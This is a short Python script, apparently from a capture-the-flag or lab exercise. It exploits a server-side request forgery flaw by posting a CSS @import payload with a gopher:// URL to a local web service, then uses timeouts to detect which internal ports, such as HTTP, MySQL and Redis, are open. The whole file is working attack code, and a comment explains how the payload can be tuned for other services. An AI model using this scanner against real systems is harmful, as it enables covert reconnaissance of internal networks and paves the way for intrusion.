import requests

URL = "http://127.0.0.1:5005"

def try_port(port):
    data = {
        'text': f"@import url(gopher://127.0.0.1:{port}/_OPTIONS%20/%20HTTP/1.1%0D%0A.css)"
        # this payload can be tweaked to cause timeouts in different types of services
        # (it's not a one-size-fits-all, this one 100% works for detecting HTTP and Redis)
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    try:
        requests.post(URL, data=data, headers=headers, timeout=2)
    except requests.exceptions.Timeout:
        return True

    return False


def scan_ports(ports):
    open_ports = []
    for port in ports:
        if try_port(port):
            open_ports.append(port)
            print(f"[*] Port {port} is open")
    return open_ports


def main():
    ports = [80, 443, 3306, 6379, 8080, 8000]

    print(f"Scanning {len(ports)} ports...")
    open_ports = scan_ports(ports)

    if open_ports:
        print(f"Open ports: {open_ports}")
    else:
        print("No open ports found.")


if __name__ == "__main__":
    main()